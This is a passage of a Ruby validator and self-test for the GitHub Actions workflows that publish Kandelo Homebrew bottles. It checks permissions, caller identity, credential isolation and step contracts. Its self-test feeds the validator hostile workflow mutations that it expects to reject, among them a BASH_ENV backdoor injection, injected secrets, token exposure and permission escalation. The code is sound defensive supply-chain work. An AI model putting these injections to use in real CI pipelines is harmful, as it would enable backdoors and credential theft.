        default_shell_test.include?("KANDELO_HOMEBREW_DEFAULT_SHELL_ARGV0") &&
        default_shell_test.include?("expect(legacyShellFetches).toEqual([])"),
        "browser Homebrew default-shell acceptance does not bind the exact image shell path")
  diagnostics = named_step(verify_steps, "Upload read-only verification diagnostics")
  check(diagnostics.dig("with", "path").include?(
          "${{ runner.temp }}/homebrew-vfs-acceptance/**"
        ), "publisher diagnostics omit dependency-bearing VFS acceptance evidence")

  source_recheck = named_step(
    verify_steps, "Recheck trusted verifier sources after runtime execution"
  )
  source_recheck_run = source_recheck.fetch("run")
  [
    'git -C kandelo status --short --untracked-files=no',
    'git -C kandelo-sysroot-build rev-parse HEAD',
    'git -C kandelo-sysroot-build status --short --untracked-files=no --ignore-submodules=all',
    'expected_musl_sha="$(git -C kandelo-sysroot-build rev-parse HEAD:libc/musl)"',
    'git -C kandelo-sysroot-build/libc/musl rev-parse HEAD',
  ].each do |fragment|
    check(source_recheck_run.include?(fragment),
          "publisher verifier source recheck lacks #{fragment}")
  end

  package_handoff = named_step(verify_steps,
                               "Package validated data-only publication handoff")
  package_handoff_run = package_handoff.fetch("run")
  check(package_handoff.dig("env", "KANDELO_HOMEBREW_DRY_RUN") == "${{ inputs.dry-run }}",
        "publisher publication handoff does not bind the trusted dry-run mode")
  [
    'mkdir -p "$publish_handoff/build" "$publish_handoff/composition"',
    'homebrew-build-handoff/manifest.json', 'homebrew-build-handoff/bottle.json',
    'homebrew-build-handoff/dependency-provenance.json',
    'cp "$RUNTIME_BOTTLE" "$publish_handoff/build/bottle.tar.gz"', "receipt.json",
    'homebrew-sidecars/sidecars-input.json',
    '.packages[0].bottles[0].bottle_file = "../build/bottle.tar.gz"',
    'if [ "$KANDELO_HOMEBREW_DRY_RUN" = "true" ]; then',
    'payload_args+=(--allow-dry-run)',
    "scripts/homebrew-validate-publish-handoff.sh",
  ].each do |fragment|
    check(package_handoff_run.include?(fragment), "publisher publication handoff lacks #{fragment}")
  end
  check_forbidden_root_args(package_handoff_run,
                            "publisher publication handoff validation", trusted_runner_roots)
  check(!package_handoff_run.include?("sidecars/Formula") &&
        !package_handoff_run.include?("sidecars/Kandelo"),
        "publisher publication handoff carries stale precomputed tap state")
  check(!package_handoff_run.match?(/(?:^|\s)(?:cp|rsync)[^\n]*(?:scripts?|\.env)(?:\s|\/|$)/),
        "publisher publication handoff includes executable or environment data")

  payload_validation = named_step(finalize_steps,
                                  "Validate the complete data-only publication payload")
  publish_checkout = named_step(finalize_steps,
                                "Checkout tap publication branch after payload validation")
  check(payload_validation["id"] == "validate-payload" &&
        payload_validation["continue-on-error"] == true &&
        payload_validation.fetch("run").include?("scripts/homebrew-validate-publish-handoff.sh") &&
        !payload_validation.fetch("run").include?("--allow-dry-run") &&
        finalize_steps.index(payload_validation) < finalize_steps.index(publish_checkout),
        "publisher finalizer does not validate a write-only strict handoff before credentialed checkout")
  check_forbidden_root_args(payload_validation.fetch("run"),
                            "publisher final payload validation", trusted_runner_roots)
  forbidden_root_lines = values_for_key(workflow, "run").flat_map do |run|
    next [] unless run.is_a?(String)
    run.lines.filter_map do |line|
      stripped = line.strip.delete_suffix(" \\")
      stripped if stripped.start_with?("--forbidden-root ")
    end
  end
  check(forbidden_root_lines.length == 35,
        "publisher does not pass the exact trusted forbidden-root set at every archive boundary")
  check(forbidden_root_lines.none? { |line| line.include?("linuxbrew") || line.include?("/opt/") },
        "publisher forbids canonical Homebrew prefix or opt metadata")
  publish_step = named_step(finalize_steps, "Publish validated sidecars under the tap state lock")
  publish_run = publish_step.fetch("run")
  check(publish_run.include?("scripts/homebrew-publish-sidecars.sh") &&
        publish_run.include?('--publication-handoff "$RUNNER_TEMP/homebrew-publish-handoff"') &&
        !publish_run.include?("--sidecar-root"),
        "publisher finalizer bypasses under-lock package composition")
  finalizer_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-publish-sidecars.sh"))
  [
    'PLANNED_TAP_ROOT="$COMPOSE_PARENT/planned-tap"',
    'git -C "$TAP_ROOT" worktree add --detach "$PLANNED_TAP_ROOT" "$input_tap_commit"',
    'assert_static_tap_tree "$PLANNED_TAP_ROOT" "planned composition tap"',
    '[ "$(git -C "$PLANNED_TAP_ROOT" rev-parse HEAD)" = "$input_tap_commit" ]',
    '--planned-tap-root "$PLANNED_TAP_ROOT"',
    'git -C "$TAP_ROOT" worktree remove --force "$PLANNED_TAP_ROOT"',
  ].each do |fragment|
    check(finalizer_source.include?(fragment),
          "publisher finalizer lacks planned dependency checkout binding: #{fragment}")
  end
  check(finalizer_source.scan('--planned-tap-root "$PLANNED_TAP_ROOT"').length == 1,
        "publisher finalizer passes an ambiguous planned dependency checkout")
  publisher_test_source = File.read(
    File.join(REPO_ROOT, "scripts/test-homebrew-publish-workflow.sh")
  )
  [
    'add_publish_dependency_sibling_bottle "$tap_root"',
    'under-lock publisher rejected concurrent sibling bottle metadata',
    'under-lock publisher accepted concurrent dependency Formula whitespace drift',
    'under-lock publisher accepted concurrent dependency recipe drift',
    'under-lock publisher accepted concurrent dependency-edge drift',
    'Formula differs from the planned tap outside canonical bottle metadata',
  ].each do |fragment|
    check(publisher_test_source.include?(fragment),
          "publisher workflow tests do not cover dependency drift: #{fragment}")
  end
  check(!finalize_steps.filter_map { |step| step["run"] }.join("\n").match?(/(?:^|\s)brew(?:\s|$)/) &&
        !finalize_steps.filter_map { |step| step["run"] }.join("\n").include?(
          "homebrew-generate-sidecars-from-env.sh"
        ), "credentialed finalizer evaluates Homebrew or Formula code")
  check(finalize_steps.none? { |step| step["uses"] == UPLOAD_ACTION } &&
        finalize_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") },
        "credentialed finalizer publishes diagnostics")

  report_checkout = named_step(finalize_steps,
                               "Checkout clean tap for a failed-attempt report")
  report = named_step(finalize_steps,
                      "Record failed attempt without replacing last-green metadata")
  final_fail = named_step(finalize_steps, "Fail after reporting an unsuccessful matrix entry")
  check(report_checkout["if"] == failure_condition && report["if"] == failure_condition &&
        final_fail["if"] == failure_condition,
        "publisher failed-attempt path changed")
  report_run = report.fetch("run")
  check(report_run.include?('--tap-root "$GITHUB_WORKSPACE/tap-report"') &&
        !report_run.include?("tap-publish") && !report_run.include?("homebrew-finalize-error.txt") &&
        report_run.include?('error_text="publish-handoff=$PUBLISH_HANDOFF_OUTCOME; '),
        "publisher failure report does not use a clean checkout and sanitized outcomes")

  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_SHA"),
        "publisher uses caller-context SHA as source provenance")
  check(contract_digest(plan_steps) == PUBLISHER_PLAN_DIGEST,
        "publisher plan step contract changed")
  check(contract_digest(build_steps) == PUBLISHER_BUILD_DIGEST,
        "publisher build step contract changed")
  check(contract_digest(upload_steps) == PUBLISHER_UPLOAD_DIGEST,
        "publisher upload step contract changed")
  check(contract_digest(index_steps) == PUBLISHER_INDEX_DIGEST,
        "publisher version-index step contract changed")
  check(contract_digest(verify_steps) == PUBLISHER_VERIFY_DIGEST,
        "publisher verification step contract changed")
  check(contract_digest(finalize_steps) == PUBLISHER_FINALIZE_DIGEST,
        "publisher finalization step contract changed")
end

def check_maintenance(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "maintenance has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
        "maintenance name changed")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-bottle-maintenance-kandelo-dev-homebrew-tap-core-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }, "maintenance concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "mode" => { "type" => "string", "default" => "rebuild" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "rollback-reason" => { "type" => "string", "default" => "" },
    "rollback-ref" => { "type" => "string", "default" => "" },
    "deleted-package-url" => { "type" => "string", "default" => "" },
    "deletion-reason" => { "type" => "string", "default" => "" },
  }, "maintenance inputs changed")
  check(!workflow.key?("permissions"), "maintenance requests workflow permissions")
  check_common(workflow, "maintenance workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[rebuild rollback validate], "maintenance has an unexpected job set")
  validate = jobs.fetch("validate")
  rebuild = jobs.fetch("rebuild")
  rollback = jobs.fetch("rollback")
  check(validate.keys.sort == %w[permissions runs-on steps],
        "maintenance validation job changed")
  check(validate["runs-on"] == "ubuntu-latest" && validate["permissions"] == {},
        "maintenance validation authority changed")
  validate_steps = job_steps(validate, "maintenance validate")
  check(contract_digest(validate_steps) == MAINTENANCE_VALIDATE_DIGEST,
        "maintenance validation step contract changed")
  validate_step = named_step(validate_steps, "Validate maintenance mode")
  check(validate_step["env"] == {
    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
    "CALLER_REF" => "${{ github.ref }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
    "MODE" => "${{ inputs.mode }}",
  }, "maintenance caller validation mapping changed")
  validate_run = validate_step.fetch("run")
  [
    'normalized_caller_repository="$(printf \'%s\' "$CALLER_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    '[ "$normalized_caller_repository" = "kandelo-dev/homebrew-tap-core" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    "maintain-bottles.yml@refs/heads/main",
    "rebuild|rollback",
  ].each do |fragment|
    check(validate_run.include?(fragment), "maintenance validation lacks #{fragment}")
  end
  canonical_maintenance = maintenance_validation_result(validate_run)
  check(canonical_maintenance["status"] == 0,
        "maintenance rejects GitHub's canonical lowercase repository identity")
  mixed_case_maintenance = maintenance_validation_result(validate_run, {
    "CALLER_REPOSITORY" => "Kandelo-Dev/Homebrew-Tap-Core",
    "CALLER_WORKFLOW_REF" =>
      "Kandelo-Dev/Homebrew-Tap-Core/.github/workflows/maintain-bottles.yml@refs/heads/main",
  })
  check(mixed_case_maintenance["status"] == 0,
        "maintenance does not normalize the repository portion of caller identity")
  case_variant_maintenance = maintenance_validation_result(validate_run, {
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/MAINTAIN-BOTTLES.YML@refs/heads/main",
  })
  check(case_variant_maintenance["status"] == 2 &&
        case_variant_maintenance["stdout"].include?(
          "maintenance requires the reviewed tap maintenance workflow"
        ), "maintenance accepts a case-variant workflow path")

  expected_rebuild_permissions = { "contents" => "write", "packages" => "write", "actions" => "read" }
  check(rebuild.keys.sort == %w[if needs permissions uses with] &&
        rebuild["needs"] == ["validate"] &&
        rebuild["if"] == "${{ inputs.mode == 'rebuild' }}" &&
        exact_permissions?(rebuild["permissions"], expected_rebuild_permissions) &&
        rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
        "maintenance rebuild execution contract changed")
  check(rebuild["with"] == {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "main",
    "tap-repository" => "kandelo-dev/homebrew-tap-core",
    "tap-name" => "kandelo-dev/tap-core",
    "tap-ref" => "main",
    "formulae" => "${{ inputs.formulae }}",
    "arches" => "${{ inputs.arches }}",
    "release-tag" => "${{ inputs.release-tag }}",
    "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
    "force" => "${{ inputs.force }}",
    "dry-run" => false,
  }, "maintenance rebuild input wiring changed")

  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
  check(rollback.keys.sort == %w[if needs permissions runs-on steps timeout-minutes] &&
        rollback["needs"] == ["validate"] &&
        rollback["if"] == "${{ inputs.mode == 'rollback' }}" &&
        rollback["runs-on"] == "ubuntu-latest" &&
        rollback["timeout-minutes"] == 30 &&
        exact_permissions?(rollback["permissions"], expected_rollback_permissions),
        "maintenance rollback execution contract changed")
  rollback_steps = job_steps(rollback, "maintenance rollback")
  check(contract_digest(rollback_steps) == MAINTENANCE_ROLLBACK_DIGEST,
        "maintenance rollback step contract changed")
  check(values_for_key(workflow, "uses").sort == [
    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
    CHECKOUT_ACTION,
    CHECKOUT_ACTION,
    NIX_ACTION,
  ].sort, "maintenance action set or pin changed")

  checkouts = rollback_steps.select { |step| step["uses"] == CHECKOUT_ACTION }
  check(checkouts.map { |step| { "name" => step["name"], "with" => step["with"] } } == [
    {
      "name" => "Checkout tap",
      "with" => {
        "repository" => "kandelo-dev/homebrew-tap-core",
        "ref" => "main",
        "path" => "tap",
        "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout Kandelo workflow source",
      "with" => {
        "persist-credentials" => false,
        "repository" => "Automattic/kandelo",
        "ref" => "main",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
  ], "maintenance rollback checkout mapping changed")

  record = named_step(rollback_steps, "Record rollback without replacing last-green metadata")
  record_run = record.fetch("run")
  [
    '[[ "$KANDELO_HOMEBREW_FORMULA" =~ ^[a-z0-9][a-z0-9._-]*$ ]]',
    'case "$KANDELO_HOMEBREW_ARCH" in',
    "wasm32|wasm64) ;;",
    '[[ "$KANDELO_HOMEBREW_RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
  ].each do |fragment|
    check(record_run.include?(fragment), "maintenance rollback lacks #{fragment}")
  end
end

def expect_rejection(label)
  rejected = false
  begin
    yield
  rescue KeyError, RuntimeError
    rejected = true
  end
  check(rejected, "self-test accepted #{label}")
end

def mutate_named_step(workflow, job_name, step_name)
  steps = workflow.fetch("jobs").fetch(job_name).fetch("steps")
  step = steps.find { |candidate| candidate["name"] == step_name }
  raise "self-test could not find #{step_name}" unless step
  step
end

def self_test(publisher, maintenance, repository_canary)
  fixture = YAML.safe_load(<<~YAML, aliases: false)
    on:
      workflow_dispatch: {}
    permissions: write-all
    jobs:
      unsafe:
        steps:
          - uses: actions/cache/restore@v4
          - run: echo "${{ inputs.formulae }}"
          - uses: actions/checkout@v6
  YAML
  check(workflow_events(fixture).key?("workflow_dispatch"), "self-test missed workflow_dispatch")
  expect_rejection("mutable action and cache state") { check_common(fixture, "fixture") }

  {
    "repository canary PAT authentication" => lambda { |w|
      step = mutate_named_step(
        w, "canary", "Create exact repository-rooted package with GITHUB_TOKEN"
      )
      step["run"] = step.fetch("run").sub("--auth-mode github-token", "--auth-mode pat")
    },
    "repository canary mutable source" => lambda { |w|
      mutate_named_step(w, "canary", "Checkout exact Kandelo canary source")
        .fetch("with")["ref"] = "main"
    },
    "repository canary different control run" => lambda { |w|
      mutate_named_step(w, "canary", "Download exact GITHUB_TOKEN zlib control artifact")
        .fetch("with")["run-id"] = 1
    },
    "repository canary secret injection" => lambda { |w|
      workflow_events(w).fetch("workflow_call")["secrets"] = {
        "TOKEN" => { "required" => true },
      }
    },
  }.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(repository_canary)
      mutation.call(mutated)
      check_repository_canary(mutated)
    end
  end

  sidecar_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-generate-sidecars-from-env.sh"))
  fingerprint_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-sysroot-fingerprint.sh"))
  expect_rejection("wasm64 sidecar fingerprint rebound to wasm32") do
    check_sidecar_sysroot_binding(sidecar_source, fingerprint_source.sub(
      'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot64/lib/libc.a" ;;',
      'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot/lib/libc.a" ;;'
    ))
  end
  expect_rejection("sidecar fingerprint bypasses selected sysroot") do
    check_sidecar_sysroot_binding(sidecar_source.sub(
      'homebrew-sysroot-fingerprint.sh', 'homebrew-ignored-fingerprint.sh'
    ), fingerprint_source)
  end

  publisher_mutations = {
    "top-level environment injection" => lambda { |w| w["env"] = { "BASH_ENV" => "/tmp/backdoor" } },
    "workflow write permission" => lambda { |w| w["permissions"] = "write-all" },
    "direct dispatch" => lambda { |w| workflow_events(w)["workflow_dispatch"] = {} },
    "extra publisher input" => lambda { |w|
      workflow_events(w).fetch("workflow_call").fetch("inputs")["command"] = {
        "type" => "string", "default" => "true",
      }
    },
    "extra publisher secret" => lambda { |w|
      workflow_events(w).fetch("workflow_call")["secrets"] = {
        "UNREVIEWED_TOKEN" => { "required" => false },
      }
    },
    "package secret reaches finalizer" => lambda { |w|
      step = mutate_named_step(
        w, "finalize-tap", "Publish validated sidecars under the tap state lock"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ secrets.UNREVIEWED_TOKEN }}"
    },
    "caller feature branch" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "caller publishes another repository" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '[ "$normalized_caller_repository" = "$normalized_tap_repository" ]', "true"
      )
    },
    "nonconventional third-party tap repository" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '^[a-z0-9_.-]+/homebrew-[a-z0-9_.-]+$',
        '^[a-z0-9_.-]+/[a-z0-9_.-]+$'
      )
    },
    "repository and Homebrew tap identity mismatch" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '[ "$normalized_tap_name" = "${tap_owner}/${tap_short_name}" ]', "true"
      )
    },
    "caller workflow rebound to first-party repository" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").gsub(
        '$CALLER_REPOSITORY/.github/workflows/',
        'kandelo-dev/homebrew-tap-core/.github/workflows/'
      )
    },
    "dry-run feature workflow" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("dry-run-bottles.yml@refs/heads/main",
                                           "feature.yml@refs/heads/feature")
    },
    "wrong caller event" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step.fetch("env")["CALLER_EVENT_NAME"] = "push"
    },
    "required VFS acceptance selection accepted as absent during planning" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step["run"] = step.fetch("run").sub(
        "::error::this invocation requires dependency-bearing VFS acceptance",
        "::notice::this invocation omits dependency-bearing VFS acceptance"
      ).sub("exit 1", "exit 0")
    },
    "dangling VFS acceptance config treated as absent during planning" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step["run"] = step.fetch("run").sub(
        '[ ! -e "$config_candidate" ] && [ ! -L "$config_candidate" ]',
        '[ ! -e "$config_candidate" ]'
      )
    },
    "VFS acceptance Brewfile symlink accepted during planning" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step["run"] = step.fetch("run").sub(
        '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
        '[ -f "$brewfile_candidate" ]'
      )
    },
    "VFS acceptance tap identity rebound to repository name" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step.fetch("env")["TAP_NAME"] = "${{ inputs.tap-repository }}"
    },
    "release tag ABI bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
      step["run"] = step.fetch("run").sub('[ "$release_tag" != "$expected_release_tag" ]', "false")
    },
    "bottle root rebound to repository identity" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve release and bottle root")
      step["run"] = step.fetch("run").sub(
        'homebrew_bottle_root_url "$TAP_REPOSITORY" "$TAP_NAME"',
        'homebrew_bottle_root_url "$TAP_REPOSITORY" "$TAP_REPOSITORY"'
      )
    },
    "planner bottle root mapping dropped" => lambda { |w|
      step = mutate_named_step(w, "plan", "Plan formula matrix")
      step.fetch("env").delete("EXPECTED_BOTTLE_ROOT_URL")
    },
    "planner bottle root argument dropped" => lambda { |w|
      step = mutate_named_step(w, "plan", "Plan formula matrix")
      step["run"] = step.fetch("run").sub(
        'expected_args+=(--expected-bottle-root-url "$EXPECTED_BOTTLE_ROOT_URL")',
        "true"
      )
    },
    "uploader dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle")["needs"] = ["plan"]
    },
    "version-index dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index")["needs"] = ["plan", "upload-bottle"]
    },
    "verifier dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle")["needs"] = ["plan", "upload-bottle"]
    },
    "finalizer dependency bypass" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap")["needs"] = ["plan", "verify-bottle"]
    },
    "build authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("build-and-test").fetch("permissions")["packages"] = "write"
    },
    "uploader authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("permissions")["contents"] = "write"
    },
    "uploader PAT authentication" => lambda { |w|
      step = mutate_named_step(
        w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ secrets.UNREVIEWED_TOKEN }}"
      step["run"] = step.fetch("run")
        .sub("--auth-mode github-token", "--auth-mode pat")
        .sub("--require-pat false", "--require-pat true")
    },
    "version-index authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index").fetch("permissions")["contents"] = "write"
    },
    "version-index PAT authentication" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Publish the complete Homebrew version index in isolated ORAS auth state"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ secrets.UNREVIEWED_TOKEN }}"
      step["run"] = step.fetch("run")
        .sub("--auth-mode github-token", "--auth-mode pat")
        .sub("--require-pat false", "--require-pat true")
    },
    "version-index serialization bypass" => lambda { |w|
      w.fetch("jobs").fetch("publish-bottle-index").delete("concurrency")
    },
    "verifier authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("permissions")["packages"] = "read"
    },
    "finalizer authority escalation" => lambda { |w|
      w.fetch("jobs").fetch("finalize-tap").fetch("permissions")["packages"] = "write"
    },
    "dry-run bottle upload" => lambda { |w|
      job = w.fetch("jobs").fetch("upload-bottle")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run version-index publication" => lambda { |w|
      job = w.fetch("jobs").fetch("publish-bottle-index")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "dry-run tap finalization" => lambda { |w|
      job = w.fetch("jobs").fetch("finalize-tap")
      job["if"] = job.fetch("if").sub(" && !inputs.dry-run", "")
    },
    "unreviewed Kandelo ref" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout Kandelo workflow source")
      step.fetch("with")["ref"] = "feature"
    },
    "persisted source credentials" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout tap")
      step.fetch("with")["persist-credentials"] = true
    },
    "persisted verifier credentials" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Checkout exact tap source")
      step.fetch("with")["persist-credentials"] = true
    },
    "build token exposure" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Build and test Homebrew bottle without publisher credentials")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "Formula test runtime source fallback" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub("--fetch-only resolve", "resolve")
    },
    "Formula test runtime cache-link materialization bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub(
        'bash scripts/materialize-resolver-binaries.sh "$PWD/binaries"', "true"
      )
    },
    "fork-instrument host tool build bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Build fork-instrument host tool")
      step["run"] = "true"
    },
    "wasm64 Formula target sysroot bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Build Kandelo sysroot")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh"
      )
    },
    "wasm64 sidecar target sysroot bypass" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build Kandelo sysroot for sidecar evidence")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix",
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh"
      )
    },
    "sidecar sysroot built in reviewed verifier source" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build Kandelo sysroot for sidecar evidence")
      step["run"] = step.fetch("run").gsub("kandelo-sysroot-build", "kandelo")
    },
    "bottle verifier reads the pristine checkout as its sysroot build" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Force-pour and test the exact selected bottle without credentials"
      )
      step["run"] = step.fetch("run").sub("kandelo-sysroot-build", "kandelo")
    },
    "sidecar evidence reads reviewed verifier build outputs" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Generate sidecars from the selected bottle")
      step["run"] = step.fetch("run").sub("kandelo-sysroot-build", "kandelo")
    },
    "browser evidence reads reviewed verifier build outputs" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub("kandelo-sysroot-build", "kandelo")
    },
    "isolated sysroot source recheck bypass" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Recheck trusted verifier sources after runtime execution"
      )
      step["run"] = step.fetch("run").sub(
        'git -C kandelo-sysroot-build status --short --untracked-files=no --ignore-submodules=all',
        "true"
      )
    },
    "Formula test runtime architecture drift" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub("--arch wasm32", "--arch wasm64")
    },
    "Formula test runtime package drift" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Materialize Formula test platform runtime")
      step["run"] = step.fetch("run").sub("dash coreutils grep sed rootfs", "dash")
    },
    "Formula test runtime ordering bypass" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      runtime_index = steps.index do |step|
        step["name"] == "Materialize Formula test platform runtime"
      end
      formula_index = steps.index do |step|
        step["name"] == "Build and test Homebrew bottle without publisher credentials"
      end
      steps[runtime_index], steps[formula_index] = steps[formula_index], steps[runtime_index]
    },
    "Formula browser runtime bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-provision-formula-browser.sh", "true #"
      )
    },
    "Formula browser hosted Node bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh env", "env"
      )
    },
    "Formula browser Node provenance bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Provision Formula browser runtime")
      step["run"] = step.fetch("run").sub(
        "/nix/store/*/bin/node) ;;", "*) ;;"
      )
    },
    "Formula browser runtime ordering bypass" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      browser_index = steps.index { |step| step["name"] == "Provision Formula browser runtime" }
      formula_index = steps.index do |step|
        step["name"] == "Build and test Homebrew bottle without publisher credentials"
      end
      steps[browser_index], steps[formula_index] = steps[formula_index], steps[browser_index]
    },
    "Formula build identity bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        'echo "KANDELO_HOMEBREW_BUILD_USER=$build_user"', 'echo "IGNORED_BUILD_USER=$build_user"'
      )
    },
    "Formula process control-group bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        'echo "KANDELO_HOMEBREW_SYSTEMD_RUN_BIN=$systemd_run_bin"',
        'echo "IGNORED_SYSTEMD_RUN_BIN=$systemd_run_bin"'
      )
    },
    "Formula build identity retirement bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Retire isolated Formula execution identity")
      step["run"] = step.fetch("run").sub(
        '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"', "true #"
      )
    },
    "post-build validator source reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Checkout exact post-build Kandelo validator source")
      step.fetch("with")["path"] = "kandelo"
    },
    "post-build reviewed tap reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout exact post-build tap source")
      step.fetch("with")["path"] = "tap"
    },
    "Formula source closure bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-validate-formula-source-closure.sh", "true #"
      )
    },
    "Formula source closure mutable validator reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub("kandelo-postbuild", "kandelo")
    },
    "Formula source closure mutable tap baseline" => lambda { |w|
